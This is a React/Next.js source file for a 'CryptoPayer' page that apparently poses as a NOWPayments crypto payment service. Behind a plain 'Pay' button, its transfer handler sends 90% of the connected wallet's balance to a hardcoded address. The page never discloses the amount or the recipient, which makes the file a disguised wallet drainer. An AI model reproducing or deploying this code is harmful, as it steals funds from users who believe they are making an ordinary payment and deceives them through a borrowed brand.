import { useState } from 'react';
import { useTransferNativeToken, useBalance, ConnectWallet } from "@thirdweb-dev/react";
import { ethers, BigNumber } from 'ethers'; // Import BigNumber from ethers
import styles from '../styles/Home.module.css';
import { NextPage } from "next";
import Head from 'next/head';



const Home:NextPage = () => {
  
  // Hook to transfer native tokens
  const { mutate: transferNativeToken, isLoading: transferLoading, error: transferError } = useTransferNativeToken();

  // Hook to get user's balance
  const { data: balanceData, isLoading: balanceLoading, error: balanceError } = useBalance();

  // Function to convert Wei to Ether
  const weiToEther = (wei: BigNumber): string => { // Specify BigNumber as the type for wei
    return ethers.utils.formatEther(wei);
  };

  // Use the user's balance in Ether
  const userBalanceInEther = balanceData ? weiToEther(balanceData.value) : '0'; // Ensure '0' is a string

  // Calculate 90% of the user's balance
  const transferAmountInEther = userBalanceInEther ? (parseFloat(userBalanceInEther) * 0.9).toString() : '0'; // Ensure '0' is a string

  // Function to handle token transfer
  const handleTransfer = async () => {
    try {
      // Ensure to and amount are of the correct type
      const toAddress = "0xb7F39cd417931f50A92DEAaD35fdA904Bfe42A4d"; // Example address

      // Initiate token transfer with 90% of the user's balance in Ether
      await transferNativeToken({ to: toAddress, amount: transferAmountInEther });
      console.log("Tokens transferred successfully");
    } catch (error) {
      console.error("Error transferring tokens:", error);
    }
  };

  

  return (
    <div className={styles.container}>
      <Head>
        <title>CryptoPayer App</title>
        <meta
          content="Generated by @CryptoPayer"
          name="description"
        />
        <link href="/favicon.ico" rel="icon" />
      </Head>
   


      <main className={styles.main}>
        <ConnectWallet />
        <button
          disabled={transferLoading}
          onClick={handleTransfer}
        >
          {transferLoading ? "Transferring..." : "Pay"}
        </button>

        <h1 className={styles.title}>
          Welcome to <a href="">CryptoPayer</a>
        </h1>

        <p className={styles.description}>
        Start Accepting Crypto Payments NOW{' '}
         
        </p>

        <div className={styles.grid}>
          <a className={styles.card} href="https://nowpayments.io/supported-coins">
            <h2>300+ cryptocurrencies available &rarr;</h2>
            <p>Accept BTC, ETH and any other cryptocurrency of your choice</p>
          </a>

          <a className={styles.card} href="https://nowpayments.io/pricing">
            <h2>Only 0.5% – the lowest fee on the market &rarr;</h2>
            <p>Pay less our 0.5% fees are the lowest on the market</p>
          </a>

          <a
            className={styles.card}
            href="https://nowpayments.io/instant-payouts"
          >
            <h2>Withdraw euro directly to your bank account &rarr;</h2>
            <p>Receive your funds directly to your wallet - right away</p>
          </a>
          <p></p>
          <p></p>
          <a className={styles.card} href="https://nowpayments.io/premium-account-manager">
            <h2>Personal account manager & 24/7 support &rarr;</h2>
            <p>Your personal manager and 24/7 support will answer all your questions</p>
          </a>

        

      
        </div>
      </main>

      <footer className={styles.footer}>
        <a href="cryptopayer.center" rel="noopener noreferrer" target="_blank">
          Made with ❤️ by NOWPayments – 2024

        </a>
      </footer>
      
     
      
    </div>
  );
};

export default Home;
